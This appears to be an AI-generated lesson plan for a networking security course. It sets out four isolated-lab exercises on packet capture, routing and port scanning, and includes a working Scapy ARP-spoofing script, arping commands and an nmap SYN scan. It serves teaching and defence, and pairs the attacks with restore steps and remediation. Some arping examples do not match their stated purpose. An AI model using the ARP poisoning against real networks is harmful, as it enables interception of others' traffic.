# 🧭 Table of Contents (Heading Links)

- [[#1. Daily Overview 🧭🌐]]
- [[#2. Learning Objectives 🎯]]
- [[#3. Required Reading and Tools 📚]]
- [[#4. Before You Start — Environment and Artifact Checklist ✅]]
- [[#5. Core Theory — The Internet as a Living System 🔬]]
- [[#6. Lab 1 — Observe a Packet Live (Deep Walkthrough) (2 hours) 🔎]]
- [[#7. Lab 2 — ARP, Spoofing, and Trust (Deep Walkthrough) (30–45 minutes) ⏱️]]
- [[#8. Lab 3 — Routing, Default Gateways, and Break/Fix (Deep Walkthrough) (30–45 minutes) ⚔️]]
- [[#9. Lab 4 — Transport Layer Conversations and Port Mailboxes (Deep Walkthrough) (30–45 minutes) 🛠️]]
- [[#10. Assignments — Expectations and Grading Hints 🧾]]
- [[#11. Mini‑Project — Build a Packet Narrative (Capstone) 🧩]]
- [[#12. Documentation and Reporting — How to Record a Networking Lab 📝]]
- [[#13. Troubleshooting and Common Pitfalls 🛠️]]
- [[#14. Reflection Prompts 🤔]]
- [[#15. Deliverables Checklist 📦]]

---

# 1. Daily Overview 🧭🌐

**Day 1 — The Shape of the Internet: OSI, TCP‑IP, and the Life of a Packet** is a guided, two‑hour immersion that turns networking from a list of facts into a living system you can reason about. The goal for today is not to memorize acronyms; it is to _feel_ how packets move, where trust is born, and where attacks naturally arise. You will watch ARP broadcasts, follow an ICMP ping from source to reply, break and repair routing, and see how Layer 2 trust and Layer 3 movement combine to create the behaviors exploited by SSRF, MITM, DNS rebinding, and cloud metadata attacks. By the end of the session you should be able to narrate the life of a packet in precise terms, explain why ARP is a trust primitive, and demonstrate simple manipulations that reveal how fragile network assumptions can be. This day is intentionally hands‑on: theory is always paired with a packet capture or a command you run yourself so every claim you make is backed by an artifact you saved.  
[[#🧭 Table of Contents]]

---

# 2. Learning Objectives 🎯

By the end of Day 1 you will be able to:

- **Explain** the OSI and TCP/IP models as _stories of transformation_ rather than rote lists, describing what each layer adds and why that matters for security.
- **Trace** a packet from a host through a gateway to a destination and back, naming the exact fields and addresses that change at each hop.
- **Demonstrate** ARP resolution, ARP cache behavior, and why ARP is trivially spoofable.
- **Break and repair** routing on a host and observe the immediate effects in a packet capture.
- **Stabilize** a minimal Win/Lin packet capture workflow (tcpdump/Wireshark) and produce reproducible artifacts with ISO timestamps.
- **Map** Layer 4 services to “mailboxes” and explain how port scanning and service discovery are simply knocking on those mailboxes.

Each objective is paired with an artifact you will save (pcap, command transcript, short note) so your learning is reproducible and auditable. These artifacts are the evidence that you actually _saw_ the internet behave.  
[[#🧭 Table of Contents]]

---

# 3. Required Reading and Tools 📚

Before you begin, skim the short readings and ensure the tools below are installed and working. The readings are intentionally light — Day 1 is about seeing, not reading — but they orient you to vocabulary and the artifacts you will produce.

**Suggested short readings (15–30 minutes total):**

- A concise primer on the **OSI model** (focus on the story of transformation, not memorization).
- A short article on **ARP** and why it is unauthenticated.
- A short primer on **ICMP** and the semantics of ping.

**Tools you will use (install and verify):**

- **tcpdump** (capture packets on Linux/Kali).
- **Wireshark** (open and inspect pcaps).
- **tshark** (optional, CLI packet inspection).
- **iproute2** (`ip` command) on Linux for route manipulation.
- **ping** / **arp** / **ip neigh** for quick checks.
- A router/firewall VM (pfSense or similar) and two hosts (Kali and Ubuntu) in a lab network.

**Verification commands (run now and save outputs):**

```bash
# Verify tcpdump and tshark
tcpdump --version > scans/tool_versions_tcpdump_$(date -u +"%Y%m%dT%H%M%SZ").txt
tshark -v > scans/tool_versions_tshark_$(date -u +"%Y%m%dT%H%M%SZ").txt

# Verify network interfaces
ip addr show > scans/ip_addr_$(date -u +"%Y%m%dT%H%M%SZ").txt
```

Save these verification files in `~/week1/scans/` (or `~/project/scans/` if you prefer). These files are part of your manifest and prove the environment used to generate later artifacts.  
[[#🧭 Table of Contents]]

---

# 4. Before You Start — Environment and Artifact Checklist ✅

Set up a small, isolated lab: three VMs on a host‑only or NAT network is ideal — **Kali (attacker/observer)**, **pfSense (router/firewall)**, and **Ubuntu (target)**. Confirm IP addressing and that you can ping between hosts. Use the following checklist and save each artifact as you complete it.

**Environment setup commands and artifacts**

```bash
# Create artifact folders
mkdir -p ~/week1/{scans,pcaps,screenshots,notes,artifacts}

# Save start time
date -u > ~/week1/scans/start_time_$(date -u +"%Y%m%dT%H%M%SZ").txt

# Quick connectivity check (run from Kali)
ip route show > ~/week1/scans/ip_route_$(date -u +"%Y%m%dT%H%M%SZ").txt
ping -c 3 192.168.20.10 > ~/week1/scans/ping_initial_$(date -u +"%Y%m%dT%H%M%SZ").txt
arp -n > ~/week1/scans/arp_table_$(date -u +"%Y%m%dT%H%M%SZ").txt
```

**What to verify and save**

- **Tool versions** (`tcpdump`, `tshark`) — _artifact:_ `~/week1/scans/tool_versions_*.txt`.
- **Interface and route state** — _artifact:_ `~/week1/scans/ip_route_*.txt`.
- **Initial ARP table** — _artifact:_ `~/week1/scans/arp_table_*.txt`.
- **Baseline ping** to the target — _artifact:_ `~/week1/scans/ping_initial_*.txt`.

These baseline artifacts are essential: they let a reviewer reproduce your lab and confirm that subsequent captures correspond to the same initial state. If anything fails at this stage (no connectivity, missing tools), fix it now and save the fix steps as part of your manifest.  
[[#🧭 Table of Contents]]

---

# 5. Core Theory — The Internet as a Living System 🔬

This section expands the conceptual story you already read: the OSI model as a narrative of transformation, and TCP/IP as the practical stack you will observe. I will explain each layer in terms of _what it does to a packet_, _what assumptions it makes_, and _what failures or attacks look like_.

**Physical Layer (what moves and why it matters).** At Layer 1 the world is analog: voltage levels, timing windows, radio frequency interference, and fiber attenuation. When you press a key, electrons move; when you transmit a Wi‑Fi frame, radio waves propagate and collide. The key security insight is that **everything above Layer 1 is built on top of noisy, lossy channels**. Practical consequence: interference or miswiring can cause packet loss, retransmissions, and timing anomalies that higher layers must handle. You do not need to design circuits, but you must respect that packets are fragile physical events.

**Data Link Layer (trust begins).** Layer 2 is where machines learn each other’s hardware names — MAC addresses — and where ARP resolves IP→MAC. ARP is _simple and trusting_: a host broadcasts “Who has X?” and any host may reply. There is no authentication. That trust is the root cause of ARP spoofing and many MITM attacks. When you see an ARP reply that claims a gateway MAC that is not the expected vendor OUI, that is a red flag. In practice, ARP poisoning is a single‑packet attack that changes the ARP cache of one or more hosts and redirects traffic.

**Network Layer (movement and instruction).** IP addresses are not physical locations; they are instructions for routing. Routers make local decisions based on prefix tables; global behavior emerges from local rules. This is why SSRF and cloud metadata attacks work: if you can make a host _ask_ for something, you can often make it ask _anywhere_ the routing table allows. NAT and proxies are also local transformations that change source addresses and therefore change trust relationships.

**Transport Layer (conversations and mailboxes).** TCP provides ordered, reliable streams; UDP provides datagrams. Ports are logical mailboxes where services listen. When you scan a host, you are knocking on these mailboxes. The semantics of TCP (SYN, SYN‑ACK, ACK) are a handshake that can be observed and manipulated; understanding the handshake explains why SYN floods, RST injections, and connection hijacking are possible.

**Application Layer (human meaning).** HTTP, DNS, TLS, and application protocols are where meaning is created. But every Layer 7 vulnerability is built on assumptions at Layers 2–4: trust in origin, correct routing, and reliable transport. If you do not understand the lower layers, you will misinterpret application behavior and miss the root cause of many bugs.

This theoretical framing is not abstract: every lab step below will show you the physical and logical transformations a packet undergoes and will force you to save artifacts that prove each claim.  
[[#🧭 Table of Contents]]

---

# 6. Lab 1 — Observe a Packet Live (Deep Walkthrough) (2 hours) 🔎

**Purpose.** See the internet happen in real time: capture ARP, ICMP, and the MAC/IP/port transformations that occur as a packet moves from Kali → pfSense → Ubuntu → back. The lab is designed so every observation produces a saved artifact (pcap, command transcript) that proves the behavior you describe.

**Environment assumptions.** Kali (192.168.20.10), pfSense (192.168.20.1), Ubuntu (192.168.20.20). Adjust addresses to your lab. Use host‑only networking or an isolated VLAN.

**Step‑by‑step walkthrough**

1. **Start a packet capture on pfSense LAN (the microscope).** On the pfSense VM or the host that bridges the LAN, start a capture and save it with an ISO timestamped filename. If you use Wireshark GUI, start capture on the LAN interface and save to `~/week1/pcaps/pfSense_lan_capture_YYYYMMDDTHHMMSSZ.pcap`. If you prefer tcpdump on a Linux host that sees the LAN:

```bash
sudo tcpdump -i eth0 -w ~/week1/pcaps/pfSense_lan_capture_$(date -u +"%Y%m%dT%H%M%SZ").pcap 'arp or icmp' &
echo $! > ~/week1/artifacts/tcpdump_pid_$(date -u +"%Y%m%dT%H%M%SZ").txt
```

**Expected output / artifact:** a pcap file containing ARP broadcasts and ICMP echo requests/replies. Save path example: `~/week1/pcaps/pfSense_lan_capture_20260603T020000Z.pcap`.

**Manifest line example:**

```
2026-06-03T02:00Z | sudo tcpdump -i eth0 -w ~/week1/pcaps/pfSense_lan_capture_20260603T020000Z.pcap 'arp or icmp' & | ~/week1/pcaps/pfSense_lan_capture_20260603T020000Z.pcap | Started LAN capture for ARP/ICMP observation
```

2. **From Kali: ping the Ubuntu host and watch the capture.** On Kali:

```bash
ping -c 4 192.168.20.20 | tee ~/week1/scans/ping_kali_to_ubuntu_$(date -u +"%Y%m%dT%H%M%SZ").txt
```

**What to observe in the pcap:** an ARP broadcast if the gateway MAC is unknown, the ARP reply from pfSense, the ICMP Echo Request with source/destination IP and MAC, and the Echo Reply back. Open the pcap in Wireshark and filter `arp` and `icmp`.

**Expected example Wireshark lines (ICMP):**

```
Frame 12: 98 bytes on wire (784 bits), 98 bytes captured (784 bits)
Ethernet II, Src: 02:42:c0:a8:14:0a, Dst: 02:42:c0:a8:14:14
Internet Protocol Version 4, Src: 192.168.20.10, Dst: 192.168.20.20
Internet Control Message Protocol
    Type: 8 (Echo (ping) request)
```

**Artifact to save:** `~/week1/pcaps/pfSense_lan_capture_20260603T020000Z.pcap` and `~/week1/scans/ping_kali_to_ubuntu_20260603T020005Z.txt`.

**Manifest line example:**

```
2026-06-03T02:00Z | ping -c 4 192.168.20.20 | tee ~/week1/scans/ping_kali_to_ubuntu_20260603T020005Z.txt | ~/week1/scans/ping_kali_to_ubuntu_20260603T020005Z.txt | Captured 4 ICMP echo requests/replies from Kali to Ubuntu
```

3. **Interpretation and immediate notes.** Open the pcap and confirm the ARP exchange preceded the ICMP. Note the MAC addresses and vendor OUIs if relevant. Save a short note:

```text
# ~/week1/notes/packet_story_20260603T020010Z.md
Observation: ARP resolved gateway 192.168.20.1 -> MAC 02:42:c0:a8:14:01 before ICMP Echo Request. ICMP payloads observed and replies returned. Conclusion: Layer 2 resolution and Layer 3 routing functioning as expected.
```

4. **Stop the capture and compress artifacts.**

```bash
# Stop tcpdump if backgrounded (use PID saved earlier)
kill $(cat ~/week1/artifacts/tcpdump_pid_20260603T020000Z.txt) || true

# Compress artifacts
zip -r ~/week1/artifacts/day1_artifacts_$(date -u +"%Y%m%dT%H%M%SZ").zip ~/week1/scans/ ~/week1/pcaps/ ~/week1/notes/
```

**Next steps and troubleshooting tips**

- If you do not see ARP, check `arp -n` on Kali and Ubuntu; ensure interfaces are on the same subnet.
- If ICMP is blocked, check pfSense firewall rules and save the rule set: `pfctl -sr > ~/week1/scans/pfctl_rules_$(date -u +"%Y%m%dT%H%M%SZ").txt`.
- If the pcap is empty, confirm you captured on the correct interface and that promiscuous mode is enabled.

This lab produces the core artifacts that prove you _saw_ the packet lifecycle. Keep them safe — they are the evidence for everything you will claim later.  
[[#🧭 Table of Contents]]

---

# 7. Lab 2 — ARP, Spoofing, and Trust (Deep Walkthrough) (30–45 minutes) ⏱️

**Purpose.** Demonstrate how trivial ARP is to manipulate and why Layer 2 trust is the root cause of many MITM attacks. This lab is intentionally small and reversible: you will perform a controlled ARP spoof against a single host and then restore the correct mapping.

**Safety and rules.** Only run this in your isolated lab. Do not ARP‑poison production networks. Save all commands and the pcap that proves the change and the restoration.

**Step‑by‑step walkthrough**

1. **Baseline ARP table and capture.** Save the current ARP table and start a short capture on pfSense or the observing host:

```bash
arp -n > ~/week1/scans/arp_before_spoof_$(date -u +"%Y%m%dT%H%M%SZ").txt
sudo tcpdump -i eth0 -w ~/week1/pcaps/arp_spoof_test_$(date -u +"%Y%m%dT%H%M%SZ").pcap arp &
echo $! > ~/week1/artifacts/tcpdump_arp_pid_$(date -u +"%Y%m%dT%H%M%SZ").txt
```

2. **Perform a controlled ARP reply (spoof).** From Kali, send a gratuitous ARP that claims the gateway IP has Kali’s MAC. Use `arping` or `scapy`. Example with `arping` (note: `arping` behavior varies by distro):

```bash
# Example using arping (may require root)
sudo arping -c 3 -s 192.168.20.10 -I eth0 192.168.20.1 | tee ~/week1/scans/arp_spoof_cmd_$(date -u +"%Y%m%dT%H%M%SZ").txt
```

If `arping` does not allow forged source, use a small Python/Scapy script (save as artifact):

```python
# ~/week1/artifacts/arp_spoof_script_20260603T020500Z.py
from scapy.all import *
arp = ARP(op=2, psrc="192.168.20.1", pdst="192.168.20.20", hwdst="02:42:c0:a8:14:14", hwsrc="02:42:c0:a8:14:0a")
send(arp, count=3)
```

Run:

```bash
sudo python3 ~/week1/artifacts/arp_spoof_script_20260603T020500Z.py | tee ~/week1/scans/arp_spoof_run_$(date -u +"%Y%m%dT%H%M%SZ").txt
```

**Expected output / artifact:** The target’s ARP cache will now map 192.168.20.1 to Kali’s MAC. The pcap will show ARP replies claiming the gateway MAC.

**Manifest line example:**

```
2026-06-03T02:05Z | sudo python3 ~/week1/artifacts/arp_spoof_script_20260603T020500Z.py | ~/week1/scans/arp_spoof_run_20260603T020505Z.txt | Sent 3 forged ARP replies claiming gateway MAC
```

3. **Observe effects and restore.** On the target, check `arp -n` and run a quick ping to see traffic behavior. Then restore the correct mapping by sending the legitimate ARP from pfSense or by rebooting the interface on the target. Example restore:

```bash
# On pfSense or the real gateway: send correct ARP (or restart interface)
# On Kali (if you control the gateway VM), re‑announce the correct MAC:
sudo arping -c 3 -s 192.168.20.1 -I eth0 192.168.20.20
```

**Artifact to save:** `~/week1/pcaps/arp_spoof_test_20260603T020500Z.pcap` and `~/week1/scans/arp_after_restore_20260603T020520Z.txt`.

**One‑line interpretation examples**

- `2026-06-03T02:05Z | arp_spoof_script_20260603T020500Z.py | ~/week1/pcaps/arp_spoof_test_20260603T020500Z.pcap | Observed forged ARP replies claiming gateway MAC; target ARP cache poisoned.`
- `2026-06-03T02:07Z | arping restore | ~/week1/scans/arp_after_restore_20260603T020520Z.txt | Gateway ARP mapping restored; traffic returned to normal.`

**Next steps and safety notes**

- If the target loses connectivity after poisoning, restore immediately and document the steps.
- Use this lab to explain why ARP is a root trust primitive and why network segmentation and dynamic ARP inspection (DAI) are important defenses.  
    [[#🧭 Table of Contents]]

---

# 8. Lab 3 — Routing, Default Gateways, and Break/Fix (Deep Walkthrough) (30–45 minutes) ⚔️

**Purpose.** Demonstrate how routing decisions create movement and how a single missing default route breaks connectivity. This lab is intentionally simple: delete the default route on Ubuntu, observe failure, then restore it and observe recovery.

**Step‑by‑step walkthrough**

1. **Save current routing table and start a capture.**

```bash
ip route show > ~/week1/scans/ubuntu_route_before_$(date -u +"%Y%m%dT%H%M%SZ").txt
sudo tcpdump -i eth0 -w ~/week1/pcaps/route_break_test_$(date -u +"%Y%m%dT%H%M%SZ").pcap 'icmp or ip' &
echo $! > ~/week1/artifacts/tcpdump_route_pid_$(date -u +"%Y%m%dT%H%M%SZ").txt
```

2. **Delete the default route on Ubuntu (break the internet).**

```bash
# On Ubuntu (target)
sudo ip route del default
ip route show > ~/week1/scans/ubuntu_route_after_del_$(date -u +"%Y%m%dT%H%M%SZ").txt
ping -c 3 8.8.8.8 > ~/week1/scans/ping_after_route_del_$(date -u +"%Y%m%dT%H%M%SZ").txt 2>&1 || true
```

**Expected behavior:** Pings fail; the pcap shows ICMP requests from Kali that never reach Ubuntu or replies that never return, depending on where you captured. Save the failure transcript.

**Manifest line example:**

```
2026-06-03T02:20Z | sudo ip route del default (on Ubuntu) | ~/week1/scans/ubuntu_route_after_del_20260603T022020Z.txt | Default route removed; host cannot reach external addresses
```

3. **Restore the default route and verify.**

```bash
# Restore (on Ubuntu)
sudo ip route add default via 192.168.20.1
ip route show > ~/week1/scans/ubuntu_route_after_restore_$(date -u +"%Y%m%dT%H%M%SZ").txt
ping -c 3 8.8.8.8 > ~/week1/scans/ping_after_route_restore_$(date -u +"%Y%m%dT%H%M%SZ").txt
```

**Expected artifact:** `~/week1/pcaps/route_break_test_20260603T020000Z.pcap` showing the moment of failure and the moment of recovery; route files before/after.

**One‑line interpretation examples**

- `2026-06-03T02:20Z | ip route del default | ~/week1/scans/ubuntu_route_after_del_20260603T022020Z.txt | Default route removed; host cannot reach external addresses.`
- `2026-06-03T02:22Z | ip route add default via 192.168.20.1 | ~/week1/scans/ubuntu_route_after_restore_20260603T022222Z.txt | Default route restored; connectivity verified with ping.`

**Next steps and troubleshooting**

- If the route cannot be restored, check `ip addr` and ensure the gateway is reachable on the same subnet.
- Use `traceroute` to observe where packets stop when the route is missing. Save `traceroute` output as an artifact.  
    [[#🧭 Table of Contents]]

---

# 9. Lab 4 — Transport Layer Conversations and Port Mailboxes (Deep Walkthrough) (30–45 minutes) 🛠️

**Purpose.** Make the abstract idea of ports and services concrete: run a simple HTTP server on Ubuntu, scan from Kali, and observe the TCP handshake and the application payload. This lab ties Layer 4 mailboxes to Layer 7 meaning.

**Step‑by‑step walkthrough**

1. **Start a simple HTTP server on Ubuntu (port 8000).**

```bash
# On Ubuntu
python3 -m http.server 8000 --bind 0.0.0.0 > ~/week1/artifacts/http_server_stdout_$(date -u +"%Y%m%dT%H%M%SZ").txt 2>&1 &
echo $! > ~/week1/artifacts/http_server_pid_$(date -u +"%Y%m%dT%H%M%SZ").txt
```

2. **From Kali, run a TCP SYN scan and a simple curl request.**

```bash
# SYN scan for port 8000
sudo nmap -sS -p 8000 -oN ~/week1/scans/nmap_http8000_$(date -u +"%Y%m%dT%H%M%SZ").txt 192.168.20.20

# Fetch the page
curl -sS http://192.168.20.20:8000/ -o ~/week1/scans/curl_http8000_$(date -u +"%Y%m%dT%H%M%SZ").html
```

**Expected outputs**

- `nmap` shows port 8000 as **open**. Save `~/week1/scans/nmap_http8000_*.txt`.
- `curl` saves the directory listing or index page to `~/week1/scans/curl_http8000_*.html`.
- In a pcap filtered for `tcp.port == 8000`, you will see the TCP three‑way handshake (SYN, SYN‑ACK, ACK) followed by the HTTP GET and the HTTP 200 response.

**Manifest line example:**

```
2026-06-03T02:40Z | sudo nmap -sS -p 8000 192.168.20.20 -oN ~/week1/scans/nmap_http8000_20260603T024040Z.txt | ~/week1/scans/nmap_http8000_20260603T024040Z.txt | Port 8000 open (HTTP server running)
```

3. **Interpretation and link to security.** Ports are mailboxes. When you scan, you are knocking. When a service responds, it reveals application behavior that can be probed for vulnerabilities. Save the `curl` output and a short note explaining what the service is and why it matters.

**Next steps**

- Try a UDP service (DNS) and observe the stateless behavior: no handshake, just request/response.
- Use `ss` or `netstat` on Ubuntu to list listening sockets and save the output as `~/week1/scans/listening_sockets_*.txt`.

This lab connects the handshake semantics you see in a pcap to the application behavior you can probe with tools like `curl` and `nmap`.  
[[#🧭 Table of Contents]]

---

# 10. Assignments — Expectations and Grading Hints 🧾

**Assignment 1 — Packet Narrative (1 hour).** Produce a one‑page narrative that tells the story of the ping you captured in Lab 1. Include: the pcap filename, three annotated screenshots from Wireshark (ARP exchange, ICMP request, ICMP reply), the exact commands you ran, and a one‑line interpretation for each artifact. **Grading:** reproducibility (can the reviewer open the pcap and see the same frames), clarity of explanation, and correct mapping of fields to behavior.

**Assignment 2 — ARP Spoof Report (30 minutes).** Document the ARP spoof experiment: the script used, the pcap showing forged ARP replies, the target ARP table before/after, and a short remediation plan (DAI, static ARP entries, port security). **Grading:** safety (did you restore state), evidence (pcap and ARP tables), and remediation quality.

**Submission format.** Put all artifacts in `~/week1/` with ISO timestamps and a short README that explains how to reproduce the key verification step (open pcap, filter `arp` and `icmp`, confirm frames). Reviewers will deduct points if artifacts are missing or commands are ambiguous.  
[[#🧭 Table of Contents]]

---

# 11. Mini‑Project — Build a Packet Narrative (Capstone) 🧩

**Goal.** Create `[[0001 Packet Narrative — Day 1]]` in your vault that is a reproducible story of a single packet journey. The page must include:

- **Executive summary** (two paragraphs) describing what you observed and why it matters.
- **Artifacts**: pcap(s), ping transcript, ARP tables before/after, route files, `curl` output, and any scripts used. Each artifact must have an ISO timestamped filename and a manifest entry.
- **Step‑by‑step reproduction**: exact commands to reproduce the capture and the verification steps.
- **Security implications**: a short section mapping observed behaviors to common attack primitives (ARP spoofing → MITM; missing default route → pivot failure; open ports → attack surface).
- **Remediation checklist**: practical, prioritized fixes for the issues you demonstrated.

Package everything into `~/week1/artifacts/day1_packet_narrative_YYYYMMDDTHHMMSSZ.zip` and include a README that explains how to validate the core claim in under five minutes (open pcap, filter `arp`, confirm ARP reply). The mini‑project is your Day 1 capstone and should be reviewable without additional scanning.  
[[#🧭 Table of Contents]]

---

# 12. Documentation and Reporting — How to Record a Networking Lab 📝

Every claim you make must point to an artifact. Use the manifest format below and include it at the root of your `~/week1/` folder. The manifest is the single source of truth for reproducibility.

**Manifest example lines (use ISO timestamps):**

```
2026-06-03T02:00Z | sudo tcpdump -i eth0 -w ~/week1/pcaps/pfSense_lan_capture_20260603T020000Z.pcap 'arp or icmp' & | ~/week1/pcaps/pfSense_lan_capture_20260603T020000Z.pcap | Started LAN capture for ARP/ICMP observation
2026-06-03T02:05Z | ping -c 4 192.168.20.20 | ~/week1/scans/ping_kali_to_ubuntu_20260603T020005Z.txt | Captured 4 ICMP echo requests/replies from Kali to Ubuntu
2026-06-03T02:05Z | python3 ~/week1/artifacts/arp_spoof_script_20260603T020500Z.py | ~/week1/scans/arp_spoof_run_20260603T020505Z.txt | Sent 3 forged ARP replies claiming gateway MAC
```

**Packaging deliverables**

```bash
zip -r ~/week1/artifacts/day1_package_$(date -u +"%Y%m%dT%H%M%SZ").zip ~/week1/scans/ ~/week1/pcaps/ ~/week1/notes/ ~/week1/artifacts/
```

Include a short `README.md` that explains the single verification step a reviewer should run (e.g., open the pcap and filter `arp` to see the forged reply). This README is the fastest path to reproducibility and will save you grading friction.  
[[#🧭 Table of Contents]]

---

# 13. Troubleshooting and Common Pitfalls 🛠️

**No ARP observed:** capture on the wrong interface or promiscuous mode disabled. Confirm `ip link` and capture on the interface that actually carries LAN traffic. Save `ip link show` as an artifact.

**tcpdump shows nothing:** ensure you have permissions and that the capture filter is correct. Try a broad capture for a short time: `sudo tcpdump -i eth0 -c 100 -w file.pcap`.

**ARP spoofing fails to change the target ARP table:** some OSes cache aggressively or the gateway re‑announces its MAC. Use repeated gratuitous ARP replies and ensure your forged MAC is plausible. Always restore state immediately.

**nmap shows filtered ports:** firewall rules on pfSense may block scans. Save `pfctl -sr` or the firewall rule export as an artifact and explain the rule that blocked the scan.

When you hit a problem, save the error output and the exact command you ran — these are the artifacts that let you debug later.  
[[#🧭 Table of Contents]]

---

# 14. Reflection Prompts 🤔

Write short answers in `~/week1/notes/reflections_$(date -u +"%Y%m%dT%H%M%SZ").md`:

- Which single packet or frame from today changed your understanding of networking the most, and why?
- Where did trust appear in the stack, and how would you defend that trust in a real network?
- Which lab step felt the most fragile (easy to break) and why?
- What one automation would you build to make these observations repeatable across different labs?

These reflections convert raw practice into durable intuition and will guide what you automate next.  
[[#🧭 Table of Contents]]

---

# 15. Deliverables Checklist 📦

Place the following in `~/week1/` and in your vault:

- **scans/**
    
    - `tool_versions_tcpdump_20260603T020000Z.txt`
    - `ip_route_20260603T020000Z.txt`
    - `ping_kali_to_ubuntu_20260603T020005Z.txt`
    - `arp_before_spoof_20260603T020000Z.txt`
    - `nmap_http8000_20260603T024040Z.txt`
    - `curl_http8000_20260603T024045Z.html`
- **pcaps/**
    
    - `pfSense_lan_capture_20260603T020000Z.pcap`
    - `arp_spoof_test_20260603T020500Z.pcap`
    - `route_break_test_20260603T020000Z.pcap`
- **artifacts/**
    
    - `arp_spoof_script_20260603T020500Z.py`
    - `http_server_pid_20260603T024000Z.txt`
    - `tcpdump_pid_20260603T020000Z.txt`
- **notes/**
    
    - `packet_story_20260603T020010Z.md`
    - `domain_profile_or_lab_readme.md`
    - `manifest_20260603T030000Z.txt`
    - `reflections_20260603T030500Z.md`
    - `executive_summary.md` (two paragraphs, client‑ready)
- **package**
    
    - `day1_artifacts_20260603T030000Z.zip` (contains scans/, pcaps/, notes/, artifacts/)

**Example two‑paragraph executive summary (client‑ready)**

> **Executive summary — Day 1:** In a controlled lab environment we observed the full lifecycle of a packet from Kali to Ubuntu via a pfSense gateway. We captured ARP resolution, the ICMP echo request and reply, and the TCP handshake for a simple HTTP service. The packet captures and command transcripts demonstrate that Layer 2 trust (ARP) and Layer 3 routing (default gateway) are the primitives that enable higher‑level application behavior.

> **Impact and recommendations:** Because ARP is unauthenticated, an attacker on the same LAN can trivially poison ARP caches and perform MITM attacks; defenses include dynamic ARP inspection, port security, and static ARP entries for critical hosts. Because routing is a local decision, misconfigurations or missing default routes can break connectivity and create pivoting opportunities; defenses include strict route management, monitoring for route changes, and host‑based firewall rules. The attached artifacts provide reproducible evidence and step‑by‑step reproduction instructions.

**Offer to expand:** I can now expand any single lab into a fully annotated, clickable walkthrough with annotated Wireshark screenshots, expected packet bytes, and a short video of the capture analysis. Which lab would you like expanded first — **Lab 1 (packet lifecycle)**, **Lab 2 (ARP spoofing)**, **Lab 3 (routing break/fix)**, or **Lab 4 (transport/application)**?  
[[#🧭 Table of Contents]]